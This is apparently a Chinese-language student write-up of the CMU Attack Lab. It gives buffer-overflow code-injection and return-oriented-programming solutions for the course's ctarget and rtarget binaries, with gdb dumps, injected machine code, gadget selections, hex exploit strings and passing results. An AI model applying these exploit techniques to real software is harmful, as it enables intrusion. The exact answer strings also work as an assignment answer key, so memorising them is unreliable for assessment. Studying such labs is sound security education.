本实验一定要仔细阅读文档, 这个实验知识了解性的, 文档上帮我们免去了很多麻烦.

# 实验1 Code Injection Attacks 代码注入攻击

每个函数都有一个栈帧, 我们的核心目的就是在getbuf()的时候, 利用buf修改掉return的rsp的地址. （这块需要了解栈结构, 去看课本）

常用操作

```
./hex2raw < ans1/ans1.txt > ans1/ans1-raw.txt 

./ctarget -q -i ans1/ans1-raw.txt 

gcc -c inject.s

objdump -d inject.o

run -q -i ans1/ans1-raw.txt 

./hex2raw <ans2/raw_string.txt> ans2/ans2.txt

./rtarget -q -i ans2/ans2.txt
```

### level1

```
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}

Dump of assembler code for function test:
    0x0000000000401968 <+0>:	sub    $0x8,%rsp
   0x000000000040196c <+4>:	 mov    $0x0,%eax
   0x0000000000401971 <+9>:	callq  0x4017a8 <getbuf>
   0x0000000000401976 <+14>:	mov    %eax,%edx
   0x0000000000401978 <+16>:	mov    $0x403188,%esi
   0x000000000040197d <+21>:	mov    $0x1,%edi
   0x0000000000401982 <+26>:	mov    $0x0,%eax
   0x0000000000401987 <+31>:	callq  0x400df0 <__printf_chk@plt>
   0x000000000040198c <+36>:	add    $0x8,%rsp
   0x0000000000401990 <+40>:	retq   
End of assembler dump.
```

```
unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf); // 其实这个Gets怎么样并不影响实验
    return 1;
}

Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:	sub    $0x28,%rsp
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq   
End of assembler dump.
```

```
(gdb) disas touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:	sub    $0x8,%rsp

touch1的地址可以从上面看到, 我们存储的时候是小端存储, 因而低位在低地址，高位在高地址。

所以level1的ans是
00 00 00 00
00 00 00 00
44 33 22 66
00 00 00 00
00 00 00 00
00 00 00 00
11 11 11 11
00 00 00 00
00 00 00 00
12 32 42 54
c0 17 40 00
```

### level2

```
(gdb) disas touch2
Dump of assembler code for function touch2:
   0x00000000004017ec <+0>:	sub    $0x8,%rsp
   0x00000000004017f0 <+4>:	mov    %edi,%edx
   0x00000000004017f2 <+6>:	movl   $0x2,0x202ce0(%rip)        # 0x6044dc <vlevel>
   0x00000000004017fc <+16>:	cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401802 <+22>:	jne    0x401824 <touch2+56>
   0x0000000000401804 <+24>:	mov    $0x4030e8,%esi
   0x0000000000401809 <+29>:	mov    $0x1,%edi
   0x000000000040180e <+34>:	mov    $0x0,%eax
   0x0000000000401813 <+39>:	callq  0x400df0 <__printf_chk@plt>
   0x0000000000401818 <+44>:	mov    $0x2,%edi
   0x000000000040181d <+49>:	callq  0x401c8d <validate>
   0x0000000000401822 <+54>:	jmp    0x401842 <touch2+86>
   0x0000000000401824 <+56>:	mov    $0x403110,%esi
   0x0000000000401829 <+61>:	mov    $0x1,%edi
   0x000000000040182e <+66>:	mov    $0x0,%eax
   0x0000000000401833 <+71>:	callq  0x400df0 <__printf_chk@plt>
   0x0000000000401838 <+76>:	mov    $0x2,%edi
   0x000000000040183d <+81>:	callq  0x401d4f <fail>
   0x0000000000401842 <+86>:	mov    $0x0,%edi
   0x0000000000401847 <+91>:	callq  0x400e40 <exit@plt>
End of assembler dump.
```

当我们注入的时候，打开调试，可以发现我们又回去执行了一圈, 范围是0x000000005561dc78到0x000000005561dca0

```
(gdb) 

0x000000005561dc78 in ?? ()

(gdb)

0x000000005561dc7d in ?? ()

(gdb)

0x000000005561dc82 in ?? ()

(gdb) stepi

0x000000005561dc87 in ?? ()

(gdb)

0x000000005561dc8c in ?? ()

(gdb)

0x000000005561dc91 in ?? ()
```

说实话, 还是第一次用这种操作, 我们竟然把自己写的汇编转成机器语言了

```
0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi // 把我们cookie的位置传给rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq   

// 要结合自己的cookie，仔细阅读文档, 其实答案都写在上面了，只是自己动手实操一下
48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
```

### level3

```
(gdb) disas touch3, //只需要首地址即可
Dump of assembler code for function touch3:
   0x00000000004018fa <+0>:	push   %rbx
```

流程是test->getbuf->inject->touch3->hexmatch->touch3->success!

```
mov $0x5561dca8,%rdi // 由于我们传入的是地址, 所以要保证这块区域不会被hexmatch覆盖, 我们把内容藏在了rsp后面, 那么地址就是0x5561dca8
push $0x4018fa // 把touch3首地址压栈, 很明显我们要前往touch3
ret 

0000000000000000 <.text>:
   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
   7:	68 fa 18 40 00       	pushq  $0x4018fa
   c:	c3                   	retq   
   
 
48 c7 c7 a8 dc 61 55 68 fa 18       // 注入代码，把cookie的内存地址传入rdi, 把touch3地址压入栈中, 然后ret                                                                         
40 00 c3 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
78 dc 61 55 00 00 00 00  
35 39 62 39 39 37 66 61 00  // cookie，用ascii码
```

# 实验2 ROP 返回指向攻击

### level2

我们还可以利用程序中原有的代码，利用ret指令跳转的特性，去执行程序中已经存在的指令。注意我们用的gadget不是汇编代码, 要参照文档，我们使用的是机器代码.

```
0000000000401994 <start_farm>:
  401994:	b8 01 00 00 00       	mov    $0x1,%eax
  401999:	c3                   	retq   

000000000040199a <getval_142>:
  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  40199f:	c3                   	retq   

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   
  

00000000004019ae <setval_237>:  
  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  4019b4:	c3                   	retq   

00000000004019b5 <setval_424>:
  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  4019bb:	c3                   	retq   

00000000004019bc <setval_470>:
  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  4019c2:	c3                   	retq   

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   

00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq   

00000000004019d0 <mid_farm>:
  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax
  4019d5:	c3                   	retq   

00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq   

00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	retq   

00000000004019e1 <setval_296>:
  4019e1:	c7 07 99 d1 90 90    	movl   $0x9090d199,(%rdi)
  4019e7:	c3                   	retq   

00000000004019e8 <addval_113>:
  4019e8:	8d 87 89 ce 78 c9    	lea    -0x36873177(%rdi),%eax
  4019ee:	c3                   	retq   

00000000004019ef <addval_490>:
  4019ef:	8d 87 8d d1 20 db    	lea    -0x24df2e73(%rdi),%eax
  4019f5:	c3                   	retq   

00000000004019f6 <getval_226>:
  4019f6:	b8 89 d1 48 c0       	mov    $0xc048d189,%eax
  4019fb:	c3                   	retq   

00000000004019fc <setval_384>:
  4019fc:	c7 07 81 d1 84 c0    	movl   $0xc084d181,(%rdi)
  401a02:	c3                   	retq   

0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq   

0000000000401a0a <setval_276>:
  401a0a:	c7 07 88 c2 08 c9    	movl   $0xc908c288,(%rdi)
  401a10:	c3                   	retq   

0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	retq   

0000000000401a18 <getval_345>:
  401a18:	b8 48 89 e0 c1       	mov    $0xc1e08948,%eax
  401a1d:	c3                   	retq   

0000000000401a1e <addval_479>:
  401a1e:	8d 87 89 c2 00 c9    	lea    -0x36ff3d77(%rdi),%eax
  401a24:	c3                   	retq   

0000000000401a25 <addval_187>:
  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
  401a2b:	c3                   	retq   

0000000000401a2c <setval_248>:
  401a2c:	c7 07 81 ce 08 db    	movl   $0xdb08ce81,(%rdi)
  401a32:	c3                   	retq   

0000000000401a33 <getval_159>:
  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
  401a38:	c3                   	retq   

0000000000401a39 <addval_110>:
  401a39:	8d 87 c8 89 e0 c3    	lea    -0x3c1f7638(%rdi),%eax
  401a3f:	c3                   	retq   

0000000000401a40 <addval_487>:
  401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax
  401a46:	c3                   	retq   

0000000000401a47 <addval_201>:
  401a47:	8d 87 48 89 e0 c7    	lea    -0x381f76b8(%rdi),%eax
  401a4d:	c3                   	retq   

0000000000401a4e <getval_272>:
  401a4e:	b8 99 d1 08 d2       	mov    $0xd208d199,%eax
  401a53:	c3                   	retq   

0000000000401a54 <getval_155>:
  401a54:	b8 89 c2 c4 c9       	mov    $0xc9c4c289,%eax
  401a59:	c3                   	retq   

0000000000401a5a <setval_299>:
  401a5a:	c7 07 48 89 e0 91    	movl   $0x91e08948,(%rdi)
  401a60:	c3                   	retq   

0000000000401a61 <addval_404>:
  401a61:	8d 87 89 ce 92 c3    	lea    -0x3c6d3177(%rdi),%eax
  401a67:	c3                   	retq   

0000000000401a68 <getval_311>:
  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
  401a6d:	c3                   	retq   

0000000000401a6e <setval_167>:
  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
  401a74:	c3                   	retq   

0000000000401a75 <setval_328>:
  401a75:	c7 07 81 c2 38 d2    	movl   $0xd238c281,(%rdi)
  401a7b:	c3                   	retq   

0000000000401a7c <setval_450>:
  401a7c:	c7 07 09 ce 08 c9    	movl   $0xc908ce09,(%rdi)
  401a82:	c3                   	retq   

0000000000401a83 <addval_358>:
  401a83:	8d 87 08 89 e0 90    	lea    -0x6f1f76f8(%rdi),%eax
  401a89:	c3                   	retq   

0000000000401a8a <addval_124>:
  401a8a:	8d 87 89 c2 c7 3c    	lea    0x3cc7c289(%rdi),%eax
  401a90:	c3                   	retq   

0000000000401a91 <getval_169>:
  401a91:	b8 88 ce 20 c0       	mov    $0xc020ce88,%eax
  401a96:	c3                   	retq   

0000000000401a97 <setval_181>:
  401a97:	c7 07 48 89 e0 c2    	movl   $0xc2e08948,(%rdi)
  401a9d:	c3                   	retq   

0000000000401a9e <addval_184>:
  401a9e:	8d 87 89 c2 60 d2    	lea    -0x2d9f3d77(%rdi),%eax
  401aa4:	c3                   	retq   

0000000000401aa5 <getval_472>:
  401aa5:	b8 8d ce 20 d2       	mov    $0xd220ce8d,%eax
  401aaa:	c3                   	retq   

0000000000401aab <setval_350>:
  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
  401ab1:	c3                   	retq   

0000000000401ab2 <end_farm>:
  401ab2:	b8 01 00 00 00       	mov    $0x1,%eax
  401ab7:	c3                   	retq
```

本来想pop %rdi直接解决战斗的，可我们发现没有给我们提供这个机器代码. 只能换思路, 这里用的是

> pop %rax。58
> mov %rax,%rdi 48 89 c7

然后就开始找吧,90 代表nop, not operation不会影响程序执行

```
00000000004019c3 <setval_426>:

4019c3: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi)

4019c9: c3 retq

00000000004019ca <getval_280>:

4019ca: b8 29 58 90 c3 mov $0xc3905829,%eax

4019cf: c3 retq
```

我们在getbuf的栈空间下分别写上这些

```
0x4019c3 pop
cookie (hex)
0x4019ca mov
touch2_adress
```

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

```
root@instance-bexsitjk:~/labs/attack# ./rtarget -q -i ans2/ans2.txt
Cookie: 0x59b997fa

Touch2!: You called touch2(0x59b997fa)

Valid solution for level 2 with target rtarget

PASS: Would have posted the following:

user id bovik

course 15213-f15

lab attacklab

result 1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

### level3

文档中说超出了课程期望, 也就是可以不做这个实验，但秉承着好奇心， 还是看一看. 在上一个level3，我们做的事情其实就是

```
mov $0x5561dca8,%rdi
push $0x4018fa
ret
```

难点在于字符串，我们怎么把字符串插入还不影响我们的程序执行呢？由于栈的运行是一行一行的, 我们没法用pop把字符串传递给寄存器, 只能把字符串写入内存, 为了不执行字符串，要把字符串放在ret touch3后面.

我们怎么把字符串给到程序?对于动态的栈这里只能用offset传递了.

```
00000000004019d6 <add_xy>:
4019d6: 48 8d 04 37 lea (%rdi,%rsi,1),%rax
4019da: c3 retq
```

level2已经用到了pop %rax, 和mov %rax,%rdi
现在我们还可以借用%rax, 同时

mov %rax,%rsi

mov %rax,%rdi

我们的步骤可能就是

offset->rax

rax->rsi,

rsp->rax

rax->rdi,

rdi + rsi ->rax ,

rax->rdi

->touch3

由于gadget有限, 我们只能用机器代码一点一点凑出来, 也许会比上面的预想更曲折

```
00000000004019db <getval_481>:

4019db: b8 5c 89 c2 90 mov $0x90c2895c,%eax // 89 c2 90 mov %eax,%edx

4019e0: c3 retq 


0000000000401a11 <addval_436>:

401a11: 8d 87 89 ce 90 90 lea -0x6f6f3177(%rdi),%eax // 89 ce 90 mov %ecx,%esi

401a17: c3 retq 


0000000000401a68 <getval_311>:

401a68: b8 89 d1 08 db mov $0xdb08d189,%eax //89 d1 08 db(08 db 不影响) mov %edx, %ecx

401a6d: c3 retq 


0000000000401a03 <addval_190>:

401a03: 8d 87 41 48 89 e0 lea -0x1f76b7bf(%rdi),%eax // 48 89 e0 mov %rsp,%rax

401a09: c3 retq
```

所以答案应该如下, 注意这里很容易错, 因为哪里数错了等等都不容易发现, 又要重新检查, 哪怕是发现正确答案还因为小错误卡了半个小时。

```cc 19 40 00 00 00 00 00 pop
offset // 要根据在哪一行给的rsp确定

4019dd // mov %eax,%edx

401a69 // mov %edx, %ecx

401a13 // mov %ecx,%esi

401a06 // mov %rsp,%rax

c5 19 40 00 00 00 00 00 // mov %rax,%rdi

4019d6 // addx_y

c5 19 40 00 00 00 00 00 // mov %rax,%rdi

fa 18 40 00 00 00 00 00 // touch3 address

35 39 62 39 39 37 66 61 00 cookie ascii

---

00 00 00 00 00 00 00 00

00 00 00 00 00 00 00 00

00 00 00 00 00 00 00 00

00 00 00 00 00 00 00 00

00 00 00 00 00 00 00 00

cc 19 40 00 00 00 00 00

20 00 00 00 00 00 00 00

dd 19 40 00 00 00 00 00

69 1a 40 00 00 00 00 00

13 1a 40 00 00 00 00 00

06 1a 40 00 00 00 00 00

c5 19 40 00 00 00 00 00

d6 19 40 00 00 00 00 00

c5 19 40 00 00 00 00 00

fa 18 40 00 00 00 00 00

35 39 62 39 39 37 66 61

00 00 00 00 00 00 00 00
```

```
root@instance-bexsitjk:~/labs/attack# ./rtarget -q -i ans2/ans2.txt 
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 20 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 69 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 
```
